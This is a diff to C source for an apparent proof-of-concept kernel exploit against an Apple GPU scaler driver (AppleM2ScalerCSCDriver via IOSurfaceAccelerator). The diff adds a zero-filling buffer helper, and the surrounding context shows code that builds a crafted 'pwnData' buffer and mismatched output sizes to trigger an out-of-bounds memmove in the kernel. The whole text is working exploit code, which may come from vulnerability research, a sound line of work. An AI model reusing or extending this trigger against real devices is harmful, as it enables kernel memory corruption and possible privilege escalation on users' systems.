@@ -28,6 +28,12 @@ struct CommApiData {
 
 uint64_t (*prepareTransformBuffersAndOptions)(IOSurfaceRef a, IOSurfaceRef b, CFDictionaryRef dict, bool unk, void *buf);
 
+void* basbuf(int size, int value) {
+  void* ptr = malloc(size);
+  memset(ptr, value, size);
+  return ptr;
+}
+
 // This function triggers an oob memmove in IosaColorManagerMSR8::getHDRStats_gatedContext
 kern_return_t trigger_memmove_oob_copy(void) {
   void *iosaHndl = dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator", RTLD_NOW);
@@ -67,7 +73,7 @@ kern_return_t trigger_memmove_oob_copy(void) {
   
   // Tell the kernel we want to do some HDR stuff
   int i = 0;
-  uint32_t *pwnData = malloc(0x4000 * 4); // Need to allocate enough space because otherwise...
+  uint32_t *pwnData = basbuf(0x4000 * 4, 0); // Need to allocate enough space because otherwise...
   pwnData[i++] = 2;      // Number of properties
   pwnData[i++] = 100;    // Size of properties
   pwnData[i++] = 'base'; // Tag
@@ -82,14 +88,14 @@ kern_return_t trigger_memmove_oob_copy(void) {
   apiDat[0].inBuf     = pwnData;
   apiDat[0].inBufSize = 0x4000 * 4;
   apiDat[0].outType   = 2;
-  apiDat[0].outBuf    = malloc(0x4000);
+  apiDat[0].outBuf    = basbuf(0x4000, 0);
   apiDat[0].outSize   = 0x1008; // Tell the kernel that we have 0x1008 bytes of space (this is the minimum)...
   
   apiDat[2].inType    = 3;
   apiDat[2].inBuf     = pwnData;
   apiDat[2].inBufSize = 0x4000 * 4;
   apiDat[2].outType   = 2;
-  apiDat[2].outBuf    = malloc(0x4000);
+  apiDat[2].outBuf    = basbuf(0x4000, 0);
   apiDat[2].outSize   = 0;      // ...and then replace the buffer with one of size zero!
   
   io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleM2ScalerCSCDriver"));
